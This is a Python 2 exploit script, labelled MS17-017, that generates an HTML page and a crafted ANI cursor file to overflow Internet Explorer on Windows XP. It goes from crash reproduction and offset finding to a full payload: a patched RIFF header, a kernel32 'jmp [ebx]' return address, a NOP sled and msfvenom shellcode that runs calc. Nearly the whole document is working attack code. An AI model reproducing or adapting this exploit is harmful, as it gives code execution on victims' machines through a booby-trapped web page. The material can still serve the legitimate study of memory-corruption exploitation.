#!/usr/bin/env python2

# MS17-017 (Internet Explorer)
# Original exploit and : https://www.exploit-db.com/exploits/16526
# Vulnerable app available in Windows XP No SP/SP1/SP2
# Exploit tested on Windows XP Media Center 2005 SP2 FR

#ANI Signature example: https://www.file-recovery.com/ani-signature-format.htm and Metasploit module
#Signature in ani variable from Metasploit module
"""
  def riff_chunk(tag, data)

    len = data.length
    padding = len % 2   # RIFF chunks must be 2 byte aligned

    return tag + [len].pack('V') + data + ("\x00" * padding)
  end
"""
#In metasploit, second chunk is "\xeb\x3b\x00\x00" -> This is a "jmp 0x3d", let's not use it for the begining
signature = b"RIFF" + b"\x78\x2e\x01\x00" + b"ACON" + b"anih" + b"\x24\x00\x00\x00"
# header variable in MSF exploit
signature   += b"\x24\x00\x00\x00" + b"\x02\x00\x00\x00" + b"\x00\x00\x00\x00"
signature   += b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
signature   += b"\x00\x00\x00\x00" + b"\x01\x00\x00\x00"

#riff_chunk("anih", overflow)
signature   += b"anih" + b"\x64\x00\x00\x00"

#Step 1: Replicate the crash
buffer = b"A"*100

#Step 2: Find the offset
buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

#Step 3: Check the offset
buffer = b"A"*80 + b"BBBB" + b"C"*500

#Step 4: Find the badchars (no badchar)
badchars = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
buffer = b"A"*80 + b"BBBB" + badchars

#Step 5: Exploit!

#At crach -> EBX: 0012AFF8  |01A20000
#01A2000: Begin of the ANI signature

# msfvenom -p windows/exec CMD=calc -f python -v shellcode
shellcode =  b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
shellcode += b"\x63\x00"

# 0x7c8104c3 : "jmp [ebx]" |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.2180 (C:\WINDOWS\system32\kernel32.dll)
ret = b"\xc3\x04\x81\x7c"

#Add a JMP in the signature
signature = signature.replace(b"\x78\x2e\x01\x00", b"\xeb\x3b\x00\x00")

# Add another jump to reach the NOP sled \xeb\x55 <=> jmp 0x57
buffer = b"A"*4 + b"\xeb\x55" + b"A"*74 + ret + b"\x43\x43\x43\x43" + "\x90"*25 + shellcode


f = open('ms17-017.html','wb')
f.write(b"<html> <body style=\"cursor: url('ms17-017.ani')\"> </html>")
f.close()

f = open('ms17-017.ani','wb')
f.write(signature  + buffer)
f.close()